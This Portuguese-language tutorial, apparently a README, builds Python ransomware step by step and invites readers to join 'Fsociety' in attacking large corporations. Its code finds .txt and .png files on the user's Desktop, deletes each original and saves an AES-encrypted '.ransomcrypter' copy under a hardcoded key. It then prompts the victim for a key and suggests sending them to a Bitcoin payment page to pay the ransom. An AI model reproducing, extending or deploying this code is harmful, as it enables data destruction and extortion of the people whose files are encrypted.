# Ransomware

Venha ajudar a Fsociety criando novos ransomwares para destruirmos as grande corporações.

1° passo:
Baixe todas os módulos python que vamos utilizar, depois leia brevemente a documentação para ter noção do que está acontecendo. 

Instalação:

```jsx
pip install "módulo"
```

Módulos utilizados:

```jsx
import os
import glob
import time
import pyaes
from pathlib import Path
```

os:  Este módulo fornece uma maneira simples de usar funcionalidades que são dependentes de sistema operacional. Se você quiser ler ou escrever um arquivo.

glob: O módulo glob encontra todos os nomes de caminho que correspondem a um padrão especificado de acordo com as regras usadas pelo shell Unix.

time: Esse módulo provê várias funções relacionadas à tempo.

pyaes: O módulo pyaes gera uma criptografia baseada em AES.

pathlib: Este módulo oferece classes que representam caminhos de sistema de arquivos com semântica apropriada para diferentes sistemas operacionais.

2° passo:

Criar uma variável que vai definir o tipo de arquivo que você vai criptografar durante o ataque.

```jsx
lista_arq = ["*.txt", "*.png"] 
```

3° passo:

Definir a pasta que o pathlib vai começar a vasculhar os arquivos.

```jsx
try:
    desktop = Path.home() / "Desktop"
except Exception:
    pass

os.chdir(desktop)
# Altera o diretório de trabalho atual para path.
```

4° passo:

Fazer uma função para criptografar os arquivos

```jsx
def criptografando():
    for files in lista_arq: 
		#for para passar por todos os arquivos e para nos que batem com lista_arq
        for format_file in glob.glob(files):
				#Retorna uma lista nomes de caminho que correspondem a pathname
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()
						#abre o pasta e le os arquivos em Binario

            os.remove(f'{desktop}\\{format_file}')
						# deleta o arquivo encontrado 
            key = b"1ab2c3e4f5g6h7i8"
						# define a chave de criptografia como 16 bytes
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.ransomcrypter)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()
```

5° passo:

Fazer uma função de decriptografia:

```jsx
def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')
```

6° passo:

Definir a forma como você vai receber o dinheiro para dar a chave de decriptografia para a vitima.

```jsx
if __name__ == '__main__':
    criptografando()
    if criptografando:
        key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
        if key == '1ab2c3e4f5g6h7i8':
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida!!!')
```

Sugestões 

Módulos: 

```jsx
webbrowser
você pode direcionar direto para um site de bitcoin com o codigo da sua carteira
de bitcoin, facilitando para a vitima pagar o "resgate" de dados
```

Cenário:
O código foi pensado para criptografar todos os arquivos na área de trabalho de maquinas com sistema operacional ubuntu, pois usuários comuns costumam salvar tudo na área de trabalho.